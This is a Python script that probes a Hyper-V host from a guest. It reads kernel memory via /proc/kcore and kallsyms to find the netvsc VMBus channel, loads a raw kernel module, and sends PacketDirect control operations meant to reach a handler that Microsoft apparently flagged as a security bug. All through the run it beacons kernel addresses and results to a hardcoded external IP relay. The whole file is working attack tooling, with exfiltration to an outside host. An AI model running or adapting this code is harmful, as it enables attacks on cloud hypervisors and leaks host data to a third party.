#!/usr/bin/env python3
"""Walk the NVSP v6 PacketDirect API control plane on the live NetVSP channel.

Starts with a count-zero receive PostBatch to prove the host dispatches the
handler behind Microsoft's "Security bug 9234257" tripwire, then walks the
bounded CONFIG/API exchanges.
"""

import base64
import ctypes
import glob
import json
import os
import struct
import time
import urllib.parse
import urllib.request

RELAY = "http://16.146.243.72:8450/MYTH_D3_PD"
NETVSC_CLASS = "f8615163-df3e-46c5-913f-f2d2f965ed0e"
PROC = "/hostproc" if os.path.exists("/hostproc/kallsyms") else "/proc"
SYS = "/hostsys" if os.path.exists("/hostsys/bus") else "/sys"
MODULE = "/tmp/hvraw_pd.ko"
PARAMS = SYS + "/module/hvraw_pd/parameters/"


def read_run_id():
    try:
        return open("/tmp/b_run_id").read().strip()
    except OSError:
        return ""


def beacon(payload):
    payload["run_id"] = read_run_id()
    data = base64.urlsafe_b64encode(json.dumps(payload, sort_keys=True).encode()).decode()
    try:
        urllib.request.urlopen(RELAY + "?d=" + urllib.parse.quote(data), timeout=3).read()
    except Exception:
        pass


class KCore:
    def __init__(self, path=PROC + "/kcore"):
        self.fd = os.open(path, os.O_RDONLY)
        header = os.pread(self.fd, 64, 0)
        fields = struct.unpack("<16sHHIQQQIHHHHHH", header)
        phoff, phentsize, phnum = fields[5], fields[9], fields[10]
        self.loads = []
        for index in range(phnum):
            raw = os.pread(self.fd, phentsize, phoff + index * phentsize)
            ptype, _, offset, vaddr, _, filesz, _, _ = struct.unpack("<IIQQQQQQ", raw[:56])
            if ptype == 1 and filesz:
                self.loads.append((vaddr, vaddr + filesz, offset))

    def read(self, address, length):
        for start, end, offset in self.loads:
            if start <= address and address + length <= end:
                return os.pread(self.fd, length, offset + address - start)
        raise ValueError("address not in kcore")


def symbol_address(name):
    with open(PROC + "/kallsyms") as stream:
        for line in stream:
            fields = line.split()
            if len(fields) >= 3 and fields[2] == name and fields[1].lower() == "t":
                return int(fields[0], 16)
    raise KeyError(name)


def channel_for_relid(kcore, relid):
    address = symbol_address("relid2channel")
    code = kcore.read(address, 160)
    for index in range(len(code) - 7):
        if not (code[index] in (0x48, 0x4C) and code[index + 1] == 0x8B
                and code[index + 2] & 0xC7 == 0x05):
            continue
        displacement = struct.unpack("<i", code[index + 3:index + 7])[0]
        global_address = address + index + 7 + displacement
        try:
            array_address = struct.unpack("<Q", kcore.read(global_address, 8))[0]
            channel_address = struct.unpack(
                "<Q", kcore.read(array_address + relid * 8, 8))[0]
        except (ValueError, struct.error):
            continue
        if channel_address > 0xffff000000000000:
            return channel_address
    raise RuntimeError("relid2channel array not resolved")


def netvsc_primary_relid():
    for class_path in glob.glob(SYS + "/bus/vmbus/devices/*/class_id"):
        value = open(class_path).read().strip().strip("{}").lower()
        if value != NETVSC_CLASS:
            continue
        device_dir = os.path.dirname(class_path)
        for channel_dir in sorted(glob.glob(device_dir + "/channels/*")):
            sub_path = channel_dir + "/subchannel_id"
            try:
                if open(sub_path).read().strip() == "0":
                    return int(os.path.basename(channel_dir)), device_dir
            except OSError:
                continue
    raise RuntimeError("netvsc primary channel not found")


def netvsc_nvdev(kcore, channel):
    callback = symbol_address("netvsc_channel_cb")
    channel_data = kcore.read(channel, 4096)
    hits = [offset for offset in range(0, len(channel_data) - 8, 8)
            if struct.unpack_from("<Q", channel_data, offset)[0] == callback]
    if len(hits) != 1:
        raise RuntimeError("netvsc callback hits=%r" % hits)
    context = struct.unpack_from("<Q", channel_data, hits[0] + 8)[0]
    context_channel, nvdev = struct.unpack("<QQ", kcore.read(context, 16))
    if context_channel != channel:
        raise RuntimeError("netvsc context mismatch")
    request_id_callback = symbol_address("vmbus_next_request_id")
    request_hits = [offset for offset in range(0, len(channel_data) - 8, 8)
                    if struct.unpack_from("<Q", channel_data, offset)[0]
                    == request_id_callback]
    if len(request_hits) != 1:
        raise RuntimeError("request-id callback hits=%r" % request_hits)
    return nvdev, hits[0], request_hits[0]


def write_param(name, value):
    open(PARAMS + name, "w").write(str(value) + "\n")


def load_module(path):
    libc = ctypes.CDLL(None, use_errno=True)
    fd = os.open(path, os.O_RDONLY)
    try:
        rc = libc.syscall(313, fd, b"", 3)
        return rc, (ctypes.get_errno() if rc else 0)
    finally:
        os.close(fd)


def kmsg_lines(needle="HVPD"):
    lines = []
    try:
        fd = os.open("/dev/kmsg", os.O_RDONLY | os.O_NONBLOCK)
    except OSError:
        return lines
    try:
        while True:
            try:
                record = os.read(fd, 8192).decode("utf-8", "replace")
            except BlockingIOError:
                break
            except OSError:
                continue
            if needle in record:
                lines.append(record.split(";", 1)[-1].strip())
    finally:
        os.close(fd)
    return lines


def dmesg_tail(marker):
    lines = kmsg_lines()
    index = 0
    for position, line in enumerate(lines):
        if marker in line:
            index = position
    return lines[index:][-14:]


def run_op(op, settings, label):
    for name, value in settings.items():
        write_param(name, value)
    write_param("op", op)
    stamp = "op=%u" % op
    try:
        write_param("arm", 1)
    except OSError as error:
        return {"label": label, "op": op, "arm_errno": error.errno}
    time.sleep(0.3)
    lines = dmesg_tail(stamp)
    comp = next((l for l in lines if "HVPD comp" in l), "")
    return {"label": label, "op": op, "dmesg": lines[-8:], "comp": comp}


def main():
    result = {"status": "init"}
    try:
        relid, device_dir = netvsc_primary_relid()
        kcore = KCore()
        channel = channel_for_relid(kcore, relid)
        nvdev, callback_offset, request_id_offset = netvsc_nvdev(kcore, channel)
        nvsp_version = struct.unpack("<I", kcore.read(nvdev, 4))[0]
        result.update({"relid": relid, "channel": hex(channel), "device": os.path.basename(device_dir)})
        result.update({"nvdev": hex(nvdev), "nvsp_version": hex(nvsp_version),
                       "callback_offset": hex(callback_offset),
                       "request_id_offset": hex(request_id_offset)})
        beacon({**result, "status": "channel_resolved"})

        send_fn = symbol_address("vmbus_sendpacket")
        recv_fn = symbol_address("vmbus_recvpacket")
        result.update({"send_fn": hex(send_fn), "recv_fn": hex(recv_fn)})

        result["uname"] = os.uname().release
        rc, errno = load_module(MODULE)
        if rc != 0 and errno != 17:  # EEXIST tolerated on rerun
            result.update({
                "status": "finit_failed",
                "rc": rc,
                "errno": errno,
                "kmsg": kmsg_lines("hvraw_pd")[-4:],
            })
            beacon(result)
            return
        beacon({**result, "status": "module_loaded"})
        write_param("channel", hex(channel))
        beacon({**result, "status": "param_channel"})
        write_param("callback_slot", hex(channel + callback_offset))
        beacon({**result, "status": "param_callback"})
        write_param("context_slot", hex(channel + callback_offset + 8))
        beacon({**result, "status": "param_context"})
        write_param("request_id_slot", hex(channel + request_id_offset))
        beacon({**result, "status": "param_request_id"})
        write_param("send_fn", hex(send_fn))
        beacon({**result, "status": "param_send"})
        write_param("recv_fn", hex(recv_fn))
        beacon({**result, "status": "param_recv"})
        write_param("wait_ms", 1500)
        beacon({**result, "status": "param_ready"})

        ops = []
        # S1: CONFIG with a null MMIO region (pure capability probe).
        ops.append(run_op(1, {"pa": 0, "len": 4096, "sub": 1}, "config_null"))
        beacon({"status": "progress", "ops": ops[-1:]})
        # Receiver gate: exact minimum receive PostBatch (count=0,is_recv=1).
        # It reaches the target handler but contains no PD buffer descriptor.
        ops.append(run_op(91, {}, "pd_postbatch_zero_control"))
        beacon({"status": "progress", "ops": ops[-1:]})
        # S2: OPEN_PROVIDER id 0.
        ops.append(run_op(3, {"prov": 0, "a": 0}, "open_provider0"))
        beacon({"status": "progress", "ops": ops[-1:]})
        # S3: ALLOC_COM_BUF 4 KiB region 1 (host-side bookkeeping; completion
        # format returns pa/len/region when supported).
        ops.append(run_op(8, {"len": 4096, "region": 1}, "alloc_com_buf"))
        beacon({"status": "progress", "ops": ops[-1:]})
        # S4: CREATE_QUEUE recv on provider 0 (only meaningful if open worked).
        ops.append(run_op(5, {"prov": 0, "q": 0, "a": 1, "len": 2048}, "create_recv_q"))
        beacon({"status": "progress", "ops": ops[-1:]})
        # S5 LAST (self-risk only): SW_DATAPATH guest_pd_enabled=1 then revert.
        ops.append(run_op(2, {"a": 0, "b": 1}, "sw_dpath_enable"))
        beacon({"status": "progress", "ops": ops[-1:]})
        ops.append(run_op(2, {"a": 0, "b": 0}, "sw_dpath_revert"))

        result.update({"status": "done", "ops": ops})
    except Exception as error:
        result.update({"status": "error", "error": "%s:%s" % (type(error).__name__, error)})
    finally:
        open("/tmp/d3-pd-result.json", "w").write(json.dumps(result, sort_keys=True) + "\n")
        beacon(result)


if __name__ == "__main__":
    main()
